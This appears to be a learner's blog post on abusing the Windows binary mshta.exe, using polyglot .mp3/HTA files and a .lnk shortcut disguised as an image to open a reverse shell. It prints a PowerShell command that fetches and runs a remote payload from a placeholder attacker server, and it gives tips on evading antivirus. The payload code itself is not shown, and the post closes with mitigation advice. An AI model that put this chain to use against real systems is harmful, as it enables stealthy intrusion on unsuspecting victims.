# mshta-abuse
## Introduction

While diving into malware analysis, I came across a technique where attackers use **HTA files** to gain unauthorized access to a victim’s device. What makes this interesting is the abuse of a built-in Windows utility called `mshta.exe`.

This post explores how `mshta` can be leveraged to execute malicious code—**without needing to download a file**—and how simple it is to pull off a stealthy reverse shell using this method. Also a walk through a proof-of-concept (PoC) attack using a disguised `.mp3` file and a `.lnk` shortcut file.


## What is `mshta.exe`?

`mshta.exe` is a **legitimate Windows binary** located at:

```
C:\Windows\System32\mshta.exe
```

Its job is to execute **HTA (HTML Application)** files. These files look like regular HTML files but with a `.hta` extension. However, unlike normal web pages, HTA files can **run powerful scripts like VBScript or JavaScript with elevated privileges**—giving attackers an easy way to run commands on a victim’s machine.


## Why Is `mshta.exe` Abused?

- **It’s a signed Microsoft binary**, so it's trusted by the system (living off the land).
- It can **execute scripts from remote URLs**, making it perfect for fileless attacks.
- **Antivirus (AV) software may not flag it**, especially if the payload is well-hidden or obfuscated.
- It supports **polyglot files**—files that are valid in more than one format (e.g., a file that is both a `.mp3` and a `.hta`).


## What Are Polyglot Files?

A **polyglot file** is a file crafted in such a way that it can be interpreted correctly as **two or more different file types**. For example, you can create a `.mp3` file that is also a valid `.hta` file.

This means we can hide a malicious HTA script inside a file that appears harmless—like a music file or image.


## Running Malicious Code Without Downloading It


Let’s say we host a polyglot `.mp3` file containing a hidden HTA script on a server.

From **PowerShell**, you can execute the remote payload like this:

```powershell
& 'C:\Windows\System32\mshta.exe' http://[ip_address]:[port]/malicious.mp3
```

> This executes the malicious payload directly from the server, without saving it locally!
>
**Python Server:**

![python_server](https://github.com/user-attachments/assets/dc194265-90fe-4e0d-b9a1-17de5e427210)

**Command Execution:**

![ps_exec](https://github.com/user-attachments/assets/e58292cd-fa80-4db0-b867-e4d7482a34db)

**Reverse Shell Connection:**

![rev_shell](https://github.com/user-attachments/assets/ab0c5828-8e1f-4050-abb9-ae130605ce0d)

### Why It Works:

- `mshta.exe` parses the file and executes the script section inside it.
- The file is never saved on the disk, making it **harder to detect**.
- Since `.mp3` is a "safe" extension, most users won't suspect anything.


## What About Antivirus?

Most antivirus software detects `mshta.exe` when it:

- Connects to the internet,
- Downloads or executes code remotely.

But we can bypass it by:

- **Obfuscating the HTA code** (e.g., encoding or encrypting it),
- Using a **local LNK (shortcut) file** to run the payload,
- **Hiding the malicious polyglot file locally**, not remotely.


## Disguised LNK

### Here's how the attack chain works:

![lamma_poc](https://github.com/user-attachments/assets/e068b954-24ac-473f-9dda-46e40a52caca)

1. **Two files are planted on the victim’s machine**:
    - A disguised `.lnk` file (looks like a `.png` image),
    - A hidden `.mp3` file containing obfuscated malicious HTA code.
2. The `.lnk` file is crafted to run this command:
    
    ```powershell
    & 'C:\Windows\System32\mshta.exe' /path/to/malicious.mp3
    ```
![payload_prop](https://github.com/user-attachments/assets/13fb6b4d-d917-4b60-9cac-97fa947dad5e)

3. When the victim **clicks on the "image"**, the `.lnk` triggers the local polyglot `.mp3` file.
4. The payload is executed, and a **reverse shell** is opened to the attacker's listener.

> The victim just opened a picture—and now the attacker has control!
> 

## Results

https://github.com/user-attachments/assets/95e61e35-15e0-4e1c-9b20-418f3d1abc75



This technique is a great example of how **Living Off the Land Binaries (LOLBins)** like `mshta.exe` can be misused to execute code in stealthy ways. With the added advantage of polyglot files and simple obfuscation, even basic Windows features become dangerous tools.


## Mitigation Tips

- Block or monitor usage of `mshta.exe` using **Application Control** tools like AppLocker or WDAC.
- Do not trust shortcut files, even if they look like images or any other harmless files.


---
> This post reflects what I’ve learned so far. If I’ve missed anything or made a mistake, feel free to reach out—I’m always eager to improve and learn more.
